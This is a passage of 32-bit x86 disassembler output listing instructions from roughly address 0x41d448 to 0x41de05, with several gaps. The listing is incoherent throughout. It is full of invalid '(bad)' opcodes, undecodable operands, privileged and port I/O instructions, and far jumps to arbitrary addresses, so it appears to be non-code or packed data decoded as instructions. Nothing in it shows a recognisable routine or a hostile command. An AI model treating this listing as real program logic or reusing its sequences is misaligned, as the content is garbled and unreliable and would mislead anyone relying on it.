  41d448:	stos   BYTE PTR es:[edi],al
  41d449:	sub    cl,cl
  41d44b:	retf   0x6b2b
  41d44e:	xchg   ecx,eax
  41d44f:	sub    DWORD PTR ds:0x73d025e9,ecx
  41d455:	icebp  
  41d456:	bound  ebx,QWORD PTR [edx]
  41d458:	hlt    
  41d459:	sbb    al,0xb
  41d45b:	and    BYTE PTR [edi+0x7a23af50],cl
  41d461:	aaa    
  41d462:	aas    
  41d463:	and    eax,0xd85e2dbf
  41d468:	jmp    0x41d412
  41d46a:	jno    0x41d418
  41d46c:	cdq    
  41d46d:	add    al,0x37
  41d46f:	pop    ebp
  41d470:	lods   al,BYTE PTR ds:[esi]
  41d471:	push   ebx
  41d472:	test   al,0x19
  41d474:	mov    WORD PTR [eax+0x3b549414],?
  41d47a:	adc    al,0xfd
  41d47c:	jle    0x41d49f
  41d47e:	(bad)  
  41d47f:	mov    esi,0x169751d4
  41d484:	add    bh,bl
  41d486:	add    BYTE PTR [eax-0x129dd08f],0x5f
  41d48d:	push   eax
  41d48e:	in     eax,0x61
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c29:0xcd38ab89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	sub    dl,ah
  41d50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d50f:	data16 in al,dx
  41d511:	fmul   QWORD PTR [eax-0x70]
  41d514:	or     al,0xe4
  41d516:	ds repnz aas 
  41d519:	stos   DWORD PTR es:[edi],eax
  41d51a:	xor    BYTE PTR [edi],ch
  41d51c:	pop    ebx
  41d51d:	dec    ebp
  41d51e:	es ds mov dh,0x6
  41d522:	push   0x4a51f5d3
  41d527:	mov    ss,ebx
  41d529:	cs cwde 
  41d52b:	(bad)  
  41d52c:	cdq    
  41d52d:	jb     0x41d53b
  41d52f:	arpl   WORD PTR [esi],di
  41d531:	push   0xffffffbb
  41d533:	add    al,0xd9
  41d535:	fwait
  41d536:	in     eax,0x8d
  41d538:	mov    ebp,0xbb87b95c
  41d53d:	iret   
  41d53e:	inc    ebp
  41d53f:	add    edx,esp
  41d541:	mov    eax,0x48e2f710
  41d546:	push   esp
  41d547:	lods   eax,DWORD PTR ds:[esi]
  41d548:	cmp    bp,WORD PTR [edi+0x45165997]
  41d54f:	xor    bl,BYTE PTR [eax]
  41d551:	push   cs
  41d552:	and    ah,0xe7
  41d555:	cmp    al,0x21
  41d557:	int3   
  41d558:	fs cld 
  41d55a:	pop    esp
  41d55b:	stc    
  41d55c:	rcl    DWORD PTR [esi-0x63],0xf9
  41d560:	in     al,dx
  41d561:	dec    ebp
  41d562:	inc    ebp
  41d563:	call   0x96b4bc53
  41d568:	fidivr WORD PTR [edx-0x62]
  41d56b:	mov    ecx,0x3cd63534
  41d570:	inc    ecx
  41d571:	inc    edx
  41d572:	or     eax,0xc54eb1a2
  41d577:	or     al,0xe5
  41d579:	jne    0x41d501
  41d57b:	add    edi,ebp
  41d57d:	pop    ecx
  41d57e:	pop    ebx
  41d57f:	add    BYTE PTR [ecx+0x3d],dh
  41d582:	sahf   
  41d583:	ins    DWORD PTR es:[edi],dx
  41d584:	mov    bl,0x4e
  41d586:	push   0xee24cd36
  41d58b:	xor    DWORD PTR [ebx],ecx
  41d58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d58e:	(bad)  
  41d58f:	hlt    
  41d590:	pop    edx
  41d591:	mov    esi,0xf1e1c467
  41d596:	(bad)
  41d59a:	lock int3 
  41d59c:	addr16 and al,0x68
  41d59f:	or     cl,BYTE PTR [edi]
  41d5a1:	lods   al,BYTE PTR ds:[esi]
  41d5a2:	adc    al,0xcb
  41d5a4:	sbb    ah,ch
  41d5a6:	ror    DWORD PTR [edx+0x353e2fc],cl
  41d5ac:	imul   edx,DWORD PTR [eax+0x4545c53],0xffffffd7
  41d5b3:	mov    ch,0x4a
  41d5b5:	ins    BYTE PTR es:[edi],dx
  41d5b6:	test   eax,0x75cf6676
  41d5bb:	or     al,0x2a
  41d5bd:	sub    eax,0xe21eb1ca
  41d5c2:	inc    edx
  41d5c3:	adc    ecx,eax
  41d5c5:	sub    dl,BYTE PTR [edx]
  41d5c7:	mov    eax,0x8a8a9a7e
  41d5cc:	test   BYTE PTR [edx+0x5d],0xa2
  41d5d0:	sbb    al,0xbc
  41d5d2:	clc    
  41d5d3:	sbb    DWORD PTR [eax+0x14a81962],0x1cb29ac8
  41d5dd:	inc    esi
  41d5de:	add    BYTE PTR [ebx],al
  41d5e0:	cmp    eax,DWORD PTR [eax+0xa]
  41d5e3:	sub    al,0xf2
  41d5e5:	push   es
  41d5e6:	xchg   esi,eax
  41d5e7:	sti    
  41d5e8:	out    0xad,eax
  41d5ea:	jge    0x41d626
  41d5ec:	in     al,dx
  41d5ed:	fadd   QWORD PTR [eax+0x75]
  41d5f0:	mov    es,WORD PTR [ebp-0x26]
  41d5f3:	in     eax,dx
  41d5f4:	or     BYTE PTR [edx+0x1baf1f61],al
  41d5fa:	cmp    al,0xb0
  41d5fc:	pop    ebx
  41d5fd:	add    ch,BYTE PTR [ecx+0x21]
  41d600:	test   eax,0x432c05de
  41d605:	jno    0x41d5f4
  41d607:	outs   dx,DWORD PTR ds:[esi]
  41d608:	add    DWORD PTR cs:[eax+0x41],ebp
  41d60c:	mov    ds:0x6d726b,al
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x4f66e435
  41d681:	repnz sbb DWORD PTR [edi+0x70],esi
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR [ecx+eax*1],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	pop    ebx
  41d68d:	push   ds
  41d68e:	sub    eax,0x880152fa
  41d693:	popa   
  41d694:	retf   0xac0c
  41d697:	js     0x41d6f7
  41d699:	dec    ebp
  41d69a:	jp     0x41d63b
  41d69c:	shl    BYTE PTR [eax+0x6],cl
  41d69f:	loope  0x41d710
  41d6a1:	push   esi
  41d6a2:	adc    DWORD PTR [esi],ebp
  41d6a4:	mov    bh,0x55
  41d6a6:	mov    ch,0xe1
  41d6a8:	cmp    eax,0x786309f5
  41d6ad:	nop
  41d6ae:	out    0x1e,eax
  41d6b0:	push   cs
  41d6b1:	dec    ecx
  41d6b2:	fld    TBYTE PTR [ecx+0x76cd8da4]
  41d6b8:	sub    DWORD PTR [esp+ebx*8-0x32],ebx
  41d6bc:	stc    
  41d6bd:	hlt    
  41d6be:	push   0xcc52da32
  41d6c3:	dec    ebp
  41d6c4:	ret    0x6d54
  41d6c7:	xor    ah,al
  41d6c9:	sahf   
  41d6ca:	jg     0x41d673
  41d6cc:	retf   0x8b93
  41d6cf:	lds    esp,FWORD PTR [edx-0x18]
  41d6d2:	loop   0x41d6e4
  41d6d4:	call   0x134eca50
  41d6d9:	xchg   edi,eax
  41d6da:	adc    al,0x26
  41d6dc:	inc    edx
  41d6dd:	cmc    
  41d6de:	adc    DWORD PTR [edx+0x44],0xe45c1d64
  41d6e5:	xor    DWORD PTR [eax+0x7098c9d2],edx
  41d6eb:	in     eax,0xdd
  41d6ed:	push   ebx
  41d6ee:	sub    DWORD PTR [ecx],0x95e3a53d
  41d6f4:	jbe    0x41d683
  41d6f6:	xor    ecx,ebx
  41d6f8:	lock inc ebx
  41d6fa:	push   0xba2c3a7f
  41d6ff:	les    eax,FWORD PTR [edx+0x3e]
  41d702:	pop    ebx
  41d703:	cmp    BYTE PTR [edx+0x3e],ch
  41d706:	adc    DWORD PTR [edi],esp
  41d708:	int    0x22
  41d70a:	ins    DWORD PTR es:[edi],dx
  41d70b:	xchg   esi,eax
  41d70c:	add    BYTE PTR [edx-0x3cb41581],0x56
  41d713:	mov    ecx,0xf12c16a6
  41d718:	xchg   ebp,eax
  41d719:	jmp    0x562a:0xc047aa1f
  41d720:	(bad)  
  41d721:	jl     0x41d780
  41d723:	rcl    ebp,0x69
  41d726:	dec    edx
  41d727:	in     al,0x67
  41d729:	inc    eax
  41d72a:	(bad)
  41d72e:	daa    
  41d72f:	scas   eax,DWORD PTR es:[edi]
  41d730:	and    BYTE PTR [edi+0x5f68ddc5],bl
  41d736:	pusha  
  41d737:	daa    
  41d738:	icebp  
  41d739:	xchg   esi,eax
  41d73a:	es push esp
  41d73c:	sub    DWORD PTR [edi+esi*1],0xcd1ce1ea
  41d743:	xor    eax,0x2f7a49be
  41d748:	mov    cl,0x5b
  41d74a:	lods   eax,DWORD PTR ds:[esi]
  41d74b:	in     eax,dx
  41d74c:	cwde   
  41d74d:	add    BYTE PTR [ebp-0x58],cl
  41d750:	push   ecx
  41d751:	add    BYTE PTR [edi-0x2d8df7f6],ch
  41d757:	ficom  DWORD PTR [edx+0x4a]
  41d75a:	pop    ds
  41d75b:	aaa    
  41d75c:	or     al,0xb2
  41d75e:	addr16 call 0x44bf:0x44ebb768
  41d766:	mov    ds:0x6635ce1,eax
  41d76b:	outs   dx,DWORD PTR ds:[esi]
  41d76c:	leave  
  41d76d:	addr16 or al,0x7f
  41d770:	addr16 or edx,esi
  41d773:	sti    
  41d774:	sub    BYTE PTR [eax],ch
  41d776:	jp     0x41d720
  41d778:	push   es
  41d779:	icebp  
  41d77a:	fsubr  QWORD PTR [edx-0x6f]
  41d77d:	cs pop esi
  41d77f:	test   BYTE PTR [edi-0x63],bh
  41d782:	lods   eax,DWORD PTR ds:[esi]
  41d783:	les    ebp,FWORD PTR gs:[esi+0x1e]
  41d787:	stos   BYTE PTR es:[edi],al
  41d788:	jne    0x41d7d4
  41d78a:	dec    ebx
  41d78b:	shl    esp,cl
  41d78d:	xor    DWORD PTR [edx+0x79],ecx
	...
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	sbb    esp,DWORD PTR ds:0x3974f31c
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	pop    ebp
  41d80d:	sbb    eax,0x559715a6
  41d812:	jb     0x41d803
  41d814:	sub    DWORD PTR [esp+edi*4-0x43e05e18],ecx
  41d81b:	in     al,dx
  41d81c:	add    BYTE PTR [ecx],bh
  41d81e:	lods   al,BYTE PTR ds:[esi]
  41d81f:	cmp    DWORD PTR [edx+0x16],edi
  41d822:	xor    BYTE PTR [eax-0x52],ch
  41d825:	mov    al,0x3f
  41d827:	jb     0x41d841
  41d829:	adc    eax,0x816ab570
  41d82e:	sub    edi,ebp
  41d830:	jbe    0x41d843
  41d832:	or     al,0x30
  41d834:	jg     0x41d833
  41d836:	mov    ah,0x90
  41d838:	push   cs
  41d839:	rol    BYTE PTR [ebp-0x56],0xf4
  41d83d:	sub    al,BYTE PTR [edi]
  41d83f:	mov    dl,0xda
  41d841:	jbe    0x41d81f
  41d843:	mov    edi,0xe3c6f96b
  41d848:	or     bl,dh
  41d84a:	test   eax,0x6d8ae218
  41d84f:	repnz icebp 
  41d851:	iret   
  41d852:	mov    eax,0xffc2e3c7
  41d857:	dec    edi
  41d858:	je     0x41d830
  41d85a:	fisubr DWORD PTR [eax+ecx*2]
  41d85d:	inc    ebp
  41d85e:	jmp    0xea4a:0xb238263d
  41d865:	clc    
  41d866:	push   ds
  41d867:	dec    ebp
  41d868:	sub    DWORD PTR [ebx+0x7ff9d907],esi
  41d86e:	or     ecx,esp
  41d870:	inc    ecx
  41d871:	stos   DWORD PTR es:[edi],eax
  41d872:	or     al,0x3c
  41d874:	inc    esp
  41d875:	out    0x35,eax
  41d877:	popf   
  41d878:	sub    DWORD PTR [ebx],0x20
  41d87b:	(bad)
  41d87f:	jnp    0x41d838
  41d881:	(bad)  
  41d882:	mov    esi,0xba7a5579
  41d887:	cs (bad) 
  41d889:	xor    al,0xfb
  41d88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d88c:	aad    0x77
  41d88e:	mov    ecx,0x1827cfdd
  41d893:	dec    edx
  41d894:	lods   eax,DWORD PTR ds:[esi]
  41d895:	dec    esp
  41d896:	(bad)  
  41d898:	and    BYTE PTR [eax],0x7e
  41d89b:	inc    esi
  41d89c:	sub    BYTE PTR [edi+0x49],0x5a
  41d8a0:	scas   eax,DWORD PTR es:[edi]
  41d8a1:	xchg   esp,eax
  41d8a2:	pop    esi
  41d8a3:	push   ebx
  41d8a4:	or     ebp,esi
  41d8a6:	fs popf 
  41d8a8:	sbb    dh,dh
  41d8aa:	mov    ah,dl
  41d8ac:	mov    ebx,0x2483e97b
  41d8b1:	inc    ebp
  41d8b2:	add    edx,DWORD PTR [eax+0x61]
  41d8b5:	loop   0x41d888
  41d8b7:	enter  0x5b5b,0x67
  41d8bb:	fmul   DWORD PTR [esp+ebp*8]
  41d8be:	iret   
  41d8bf:	xchg   esp,eax
  41d8c0:	lods   al,BYTE PTR ds:[esi]
  41d8c1:	dec    eax
  41d8c2:	mov    ds:0xecf6a47b,al
  41d8c7:	daa    
  41d8c8:	cmp    BYTE PTR [edi-0x6b],0x7
  41d8cc:	mov    DWORD PTR [ebp-0x1372530e],esi
  41d8d2:	pop    ss
  41d8d3:	or     DWORD PTR [ecx-0x42c11304],edi
  41d8d9:	mov    ah,0x3
  41d8db:	mov    al,ds:0x14ab863
  41d8e0:	out    dx,eax
  41d8e1:	push   edx
  41d8e2:	cld    
  41d8e3:	jnp    0x41d8ca
  41d8e5:	pusha  
  41d8e6:	xor    al,0x44
  41d8e8:	sub    cl,BYTE PTR [ecx+0x4a4c227f]
  41d8ee:	cmpps  xmm3,XMMWORD PTR [eax-0x7],0x51
  41d8f3:	loopne 0x41d96d
  41d8f5:	jnp    0x41d8b4
  41d8f7:	stos   DWORD PTR es:[edi],eax
  41d8f8:	iret   
  41d8f9:	lds    esp,FWORD PTR [ebx+0x8]
  41d8fc:	cmc    
  41d8fd:	bound  esi,QWORD PTR [eax+0x3f]
  41d900:	sahf   
  41d901:	(bad)  
  41d902:	(bad)  
  41d903:	mov    edx,0xd45ad5c1
  41d908:	das    
  41d909:	gs cmp eax,0xea7742fa
  41d90f:	js     0x41d911
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs and edi,edx
  41d982:	das    
  41d983:	dec    ecx
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	retf   0xa238
  41d98f:	sub    DWORD PTR [ebp+0x77],esp
  41d992:	in     eax,0xf8
  41d994:	dec    edx
  41d995:	imul   esi,edx,0x647dda8d
  41d99b:	jo     0x41d9b7
  41d99d:	cmp    eax,eax
  41d99f:	ins    DWORD PTR es:[edi],dx
  41d9a0:	or     al,0xd4
  41d9a2:	mov    esi,0x23e0d65a
  41d9a7:	jae    0x41da24
  41d9a9:	(bad)  
  41d9aa:	mov    WORD PTR ds:0x7428343a,es
  41d9b0:	outs   dx,DWORD PTR ds:[esi]
  41d9b1:	jno    0x41d9af
  41d9b3:	xor    DWORD PTR [esp+edx*4+0x64],esi
  41d9b7:	mov    ch,0x64
  41d9b9:	lahf   
  41d9ba:	popf   
  41d9bb:	mov    ecx,0xcb1c9926
  41d9c0:	pop    esp
  41d9c1:	out    0xf3,al
  41d9c3:	ss adc eax,0xa9116e55
  41d9c9:	mov    ds:0x7c11408b,al
  41d9ce:	dec    esp
  41d9cf:	out    dx,al
  41d9d0:	jl     0x41d993
  41d9d2:	sbb    BYTE PTR [esp+ebp*1],dl
  41d9d5:	xchg   edx,eax
  41d9d6:	jl     0x41d9f2
  41d9d8:	test   al,bl
  41d9da:	adc    bh,dl
  41d9dc:	add    BYTE PTR [ebx-0x6a],dh
  41d9df:	jmp    0xd12b9a6d
  41d9e4:	shl    BYTE PTR [ebx+0x5b9e020a],cl
  41d9ea:	xor    BYTE PTR [esi],ah
  41d9ec:	xor    ah,0x46
  41d9ef:	inc    esp
  41d9f0:	push   edx
  41d9f1:	mov    ds:0xc8d5e527,al
  41d9f6:	and    DWORD PTR [edx+eax*8],edi
  41d9f9:	ins    BYTE PTR es:[edi],dx
  41d9fa:	stos   BYTE PTR es:[edi],al
  41d9fb:	arpl   WORD PTR [ecx+0x22],ax
  41d9fe:	outs   dx,BYTE PTR ds:[esi]
  41d9ff:	mov    DWORD PTR [esi],ebp
  41da01:	jge    0x41da31
  41da03:	out    dx,eax
  41da04:	pop    es
  41da05:	sub    BYTE PTR [ecx],dl
  41da07:	add    edx,DWORD PTR [eax+edi*4]
  41da0a:	jno    0x41da76
  41da0c:	pop    ebp
  41da0d:	pop    ebp
  41da0e:	daa    
  41da0f:	shr    BYTE PTR fs:[eax-0x5e14e75f],1
  41da16:	mov    ds:0x2701bf75,al
  41da1b:	sbb    al,0x29
  41da1d:	mov    dl,0xac
  41da1f:	jno    0x41da44
  41da21:	test   BYTE PTR [ecx+ebx*2+0x28],dh
  41da25:	sbb    ecx,DWORD PTR [eax+0x6d]
  41da28:	std    
  41da29:	push   esp
  41da2a:	(bad)  
  41da2b:	push   ss
  41da2c:	mov    al,ds:0x3020c57b
  41da31:	mov    bh,0xd6
  41da33:	xchg   edi,eax
  41da34:	sar    cl,1
  41da36:	clc    
  41da37:	jb     0x41da45
  41da39:	in     eax,0x2e
  41da3b:	out    0xff,al
  41da3d:	(bad)  
  41da3e:	shl    BYTE PTR [ecx-0x27],1
  41da41:	mov    edx,0x843bfd4d
  41da46:	scas   al,BYTE PTR es:[edi]
  41da47:	mov    eax,ds:0x189f6583
  41da4c:	and    DWORD PTR [edi],0x3d
  41da4f:	sbb    eax,0xcbc01209
  41da54:	sub    DWORD PTR [eax+0xde710c9],edx
  41da5a:	inc    edx
  41da5b:	(bad)  
  41da5c:	out    0x9e,eax
  41da5e:	mov    al,0xaa
  41da60:	outs   dx,BYTE PTR ds:[esi]
  41da61:	cmp    edi,DWORD PTR [edx-0x52]
  41da64:	popa   
  41da65:	jp     0x41da58
  41da67:	imul   ecx,DWORD PTR [esi],0xc5e40b64
  41da6d:	in     eax,0x4c
  41da6f:	ja     0x41da28
  41da71:	adc    BYTE PTR [esi+edi*1+0x36318fdc],dl
  41da78:	xchg   ebp,eax
  41da79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da7a:	ss mov esi,0x6b6aba4a
  41da80:	sbb    al,ah
  41da82:	out    dx,eax
  41da83:	clc    
  41da84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da85:	dec    esp
  41da86:	dec    esp
  41da87:	outs   dx,DWORD PTR ds:[esi]
  41da88:	xchg   edx,eax
  41da89:	adc    dl,BYTE PTR [ebp+eiz*4+0x7a58bc0c]
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x9
  41db01:	adc    ebx,esi
  41db03:	and    BYTE PTR [ebx+edi*1+0x1],bh
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	fisub  DWORD PTR [edx-0x23]
  41db0f:	mov    dh,0x79
  41db11:	push   edi
  41db12:	pop    eax
  41db13:	rcr    DWORD PTR [eax],0x1c
  41db16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db17:	mov    DWORD PTR [ebx],ebp
  41db19:	(bad)  
  41db1a:	pop    edx
  41db1b:	jo     0x41db5f
  41db1d:	sub    al,0x54
  41db1f:	jo     0x41db03
  41db21:	cmp    al,0x25
  41db23:	mov    bl,0xe7
  41db25:	mov    ecx,0xa9b94ef3
  41db2a:	and    BYTE PTR [esp+esi*8],bh
  41db2d:	xchg   edi,eax
  41db2e:	xlat   BYTE PTR ds:[ebx]
  41db2f:	pusha  
  41db30:	and    ecx,DWORD PTR [edi]
  41db32:	mov    ds:0x2c2b2622,eax
  41db37:	pusha  
  41db38:	imul   ebx,edi,0xb84dddb8
  41db3e:	xchg   DWORD PTR [eax-0x71dec3bf],edx
  41db44:	sub    bl,BYTE PTR [ecx+0x25]
  41db47:	jmp    0x41daca
  41db49:	call   0xc50af301
  41db4e:	xchg   ecx,eax
  41db4f:	jg     0x41dae3
  41db51:	and    BYTE PTR [edx+0x3d18faa8],0x3b
  41db58:	and    al,0x70
  41db5a:	adc    al,0xb6
  41db5c:	pop    esi
  41db5d:	xor    DWORD PTR [edx+0x27],esi
  41db60:	sbb    edi,ebx
  41db62:	sahf   
  41db63:	scas   eax,DWORD PTR es:[edi]
  41db64:	sbb    cl,bl
  41db66:	cld    
  41db67:	dec    eax
  41db68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db69:	add    BYTE PTR [eax-0x4e],0x59
  41db6d:	pop    ebp
  41db6e:	push   edi
  41db6f:	pop    ds
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	loopne 0x41db5d
  41db73:	push   0x2dba5e41
  41db78:	ins    DWORD PTR es:[edi],dx
  41db79:	loop   0x41dba4
  41db7b:	and    bl,dl
  41db7d:	xor    esi,eax
  41db7f:	ja     0x41db49
  41db81:	adc    eax,0x4b6a5e36
  41db86:	sub    al,0x25
  41db88:	push   ecx
  41db89:	sub    bl,ah
  41db8b:	adc    BYTE PTR [esi+esi*2-0x73],0x4c
  41db90:	mov    bl,0x3f
  41db92:	sahf   
  41db93:	add    ah,BYTE PTR [ebx]
  41db95:	outs   dx,BYTE PTR ds:[esi]
  41db96:	push   eax
  41db97:	dec    edi
  41db98:	test   eax,0xe686f5a9
  41db9d:	adc    DWORD PTR [ebx+ebp*4],esi
  41dba0:	add    al,0x94
  41dba2:	mov    edx,0x5f23f6d8
  41dba7:	jbe    0x41dbb4
  41dba9:	shl    DWORD PTR [bx-0x7e2b],0x7a
  41dbaf:	push   ss
  41dbb0:	mov    dl,0x24
  41dbb2:	push   0x65
  41dbb4:	add    al,0xb2
  41dbb6:	es inc ebx
  41dbb8:	sub    eax,0xf354573
  41dbbd:	bound  esi,QWORD PTR [ebp+0x13]
  41dbc0:	stos   DWORD PTR es:[edi],eax
  41dbc1:	jae    0x41dc30
  41dbc3:	das    
  41dbc4:	cmp    ch,BYTE PTR [edx+0x54]
  41dbc7:	mov    ebp,0x8f05b7f9
  41dbcc:	cwde   
  41dbcd:	icebp  
  41dbce:	mov    edi,0x89f92e7c
  41dbd3:	inc    edi
  41dbd4:	call   FWORD PTR [eax-0x1b10fc3c]
  41dbda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbdb:	lock and eax,0xdd06956d
  41dbe1:	ins    DWORD PTR es:[edi],dx
  41dbe2:	in     eax,dx
  41dbe3:	pop    esi
  41dbe4:	mov    DWORD PTR [ebx+ecx*4-0x3a],ecx
  41dbe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbe9:	adc    ah,BYTE PTR [edi+ebx*1-0x54]
  41dbed:	das    
  41dbee:	pop    es
  41dbef:	in     al,0x81
  41dbf1:	push   ebp
  41dbf2:	mov    ebx,ebx
  41dbf4:	aad    0x31
  41dbf6:	std    
  41dbf7:	cmp    bl,BYTE PTR [edx+0x7a]
  41dbfa:	mov    cl,BYTE PTR [edi-0x5d]
  41dbfd:	mov    edi,DWORD PTR [eax]
  41dbff:	push   ebx
  41dc00:	inc    edi
  41dc01:	out    0x61,eax
  41dc03:	sti    
  41dc04:	mov    ecx,0xf3c194b3
  41dc09:	add    eax,0x5672ee0d
  41dc0e:	loop   0x41dbaa
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi-0x44f2fb0]
  41dc81:	push   es
  41dc82:	add    edi,ecx
  41dc84:	cmp    BYTE PTR [ecx+eax*1],0x0
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	jmp    DWORD PTR [eax+edx*8-0x51]
  41dc90:	cmc    
  41dc91:	ss (bad) 
  41dc93:	jp     0x41dc60
  41dc95:	(bad)
  41dc99:	push   eax
  41dc9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc9b:	xor    ebx,esi
  41dc9d:	pop    esp
  41dc9e:	das    
  41dc9f:	(bad)  
  41dca0:	lods   eax,DWORD PTR ds:[esi]
  41dca1:	inc    esi
  41dca2:	add    DWORD PTR ds:0x63270ac4,0x2b
  41dca9:	mov    eax,edi
  41dcab:	xchg   edx,eax
  41dcac:	mov    ?,ecx
  41dcae:	push   0x27ec659d
  41dcb3:	imul   ebp,DWORD PTR [edx],0xffffffff
  41dcb6:	bound  ebx,QWORD PTR [esi]
  41dcb8:	mov    ebp,es
  41dcba:	mov    dh,0x80
  41dcbc:	(bad)  
  41dcbe:	loope  0x41dcb3
  41dcc0:	ret    
  41dcc1:	out    0xde,eax
  41dcc3:	gs out 0x92,eax
  41dcc6:	xor    al,BYTE PTR [eax-0x3aa46464]
  41dccc:	lea    ebx,[ebp-0x35572683]
  41dcd2:	sbb    DWORD PTR ss:[edx],edi
  41dcd5:	mov    eax,ds:0x9e1c8b6a
  41dcda:	outs   dx,BYTE PTR ds:[esi]
  41dcdb:	inc    edx
  41dcdc:	xchg   edx,eax
  41dcdd:	mov    gs,edi
  41dcdf:	inc    ebx
  41dce0:	xor    DWORD PTR ds:0x55c8254,edi
  41dce6:	mov    ?,ebp
  41dce8:	in     al,0x6f
  41dcea:	cmp    dl,bl
  41dcec:	lods   eax,DWORD PTR ds:[esi]
  41dced:	mov    ebx,0x70d0da66
  41dcf2:	dec    ebx
  41dcf3:	adc    DWORD PTR [ebx],0xaf60d0e8
  41dcf9:	mov    bh,0x1a
  41dcfb:	inc    ebp
  41dcfc:	pop    edx
  41dcfd:	jbe    0x41dd3c
  41dcff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd00:	outs   dx,BYTE PTR ds:[esi]
  41dd01:	(bad)  
  41dd02:	stc    
  41dd03:	xchg   ebp,eax
  41dd04:	and    edx,esp
  41dd06:	arpl   WORD PTR [ebx],cx
  41dd08:	in     al,0x3b
  41dd0a:	mov    BYTE PTR [ecx-0x77fd1a79],bh
  41dd10:	xchg   edx,eax
  41dd11:	jb     0x41dd7f
  41dd13:	outs   dx,DWORD PTR ds:[esi]
  41dd14:	rol    DWORD PTR [edi-0x7fa8cdb8],1
  41dd1a:	mov    ch,BYTE PTR [edi]
  41dd1c:	js     0x41dd2f
  41dd1e:	icebp  
  41dd1f:	scas   eax,DWORD PTR es:[di]
  41dd21:	ret    0x3bfa
  41dd24:	mov    al,ds:0x3159760d
  41dd29:	std    
  41dd2a:	or     BYTE PTR ss:[eax+eiz*4+0x22],ah
  41dd2f:	xchg   BYTE PTR [eax+edx*2],bl
  41dd32:	ror    BYTE PTR [ebx],1
  41dd34:	scas   al,BYTE PTR es:[edi]
  41dd35:	and    al,0xcd
  41dd37:	cld    
  41dd38:	outs   dx,BYTE PTR ds:[esi]
  41dd39:	into   
  41dd3a:	sbb    dl,BYTE PTR [ecx]
  41dd3c:	mov    esi,0x224d46e8
  41dd41:	xchg   ebp,eax
  41dd42:	inc    edi
  41dd43:	test   eax,0xec8666ab
  41dd48:	mov    ?,ebx
  41dd4a:	adc    cl,BYTE PTR [esp+edi*1-0x12aac60f]
  41dd51:	sub    cl,BYTE PTR [esi]
  41dd53:	fadd   st(7),st
  41dd55:	xor    al,0x92
  41dd57:	test   eax,0x6912ad40
  41dd5c:	in     eax,0xa9
  41dd5e:	mov    esp,0xae124cf1
  41dd63:	fucom  st(2)
  41dd65:	mov    dh,0x83
  41dd67:	inc    edx
  41dd68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd69:	xchg   ecx,eax
  41dd6a:	ins    BYTE PTR es:[edi],dx
  41dd6b:	or     al,0xdd
  41dd6d:	xchg   edi,eax
  41dd6e:	sbb    DWORD PTR [edi+esi*8-0xee9cb66],esi
  41dd75:	test   DWORD PTR ds:0xeeddcbdb,ecx
  41dd7b:	aas    
  41dd7c:	arpl   WORD PTR [edx],cx
  41dd7e:	mov    ebx,0x81a48dc7
  41dd83:	lods   eax,DWORD PTR ds:[esi]
  41dd84:	icebp  
  41dd85:	mov    ds:0xb5924e57,eax
  41dd8a:	loopne 0x41ddda
  41dd8c:	cdq    
  41dd8d:	imul   esp,DWORD PTR [ebp+0x60],0x0
	...
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	sbb    dh,BYTE PTR [ecx]
  41de02:	shr    dl,0x84
  41de05:	cmp    eax,0x1040001
